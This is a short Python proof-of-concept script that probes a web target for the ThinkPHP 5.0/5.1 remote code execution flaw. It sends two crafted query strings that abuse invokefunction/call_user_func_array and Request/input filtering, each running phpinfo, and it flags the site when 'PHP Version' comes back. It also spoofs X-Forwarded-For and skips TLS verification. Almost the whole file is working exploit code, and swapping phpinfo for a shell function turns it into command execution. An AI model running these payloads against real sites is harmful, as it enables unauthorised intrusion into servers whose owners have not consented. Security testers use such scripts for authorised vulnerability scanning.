#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
Copyright (c) saucerman (https://xiaogeng.top)
See the file 'LICENSE' for copying permission
"""

import sys
import requests
# try :
#     import tldextract
# except:
#     print('Cant import tldextract \nTry \"pip install tldextract\"')
#     sys.exit()

def poc(domain_url):
    try:
        # if "https://" in domain_url:
        #     protocol = "https://"
        # else:
        #     protocol = "http://"
        
        # return to top path 
        # 'https://www.xiaogeng.com.cn/admin.php?id=6'==>'https://www.xiaogeng.com.cn'
        #key_tmp  = tldextract.extract(domain_url)
        #domain_url = protocol + key_tmp.subdomain + '.' + key_tmp.domain+'.' + key_tmp.suffix 

        if "http" not in domain_url:
            domain_url = "http://" + domain_url
        thinkphp50_poc = r"/?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1"
        thinkphp51_poc = r"/?s=index/\think\Request/input&filter=phpinfo&data=1"
        
        headers = {
            "Accept": "*/*",
            "User-Agent": "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; en) Opera 9.50",
            "X-Forwarded-For":"192.168.1.1"
        }
        r1 = requests.get(domain_url + thinkphp50_poc, headers=headers,verify=False, timeout =10,allow_redirects=False)
        if "PHP Version" in r1.text:
            return 1

        r2 = requests.get(domain_url + thinkphp51_poc, headers=headers, verify=False, timeout =10,allow_redirects=False)
        if "PHP Version" in r2.text:
            return 1

        return 0

    except Exception as e:
        return 0

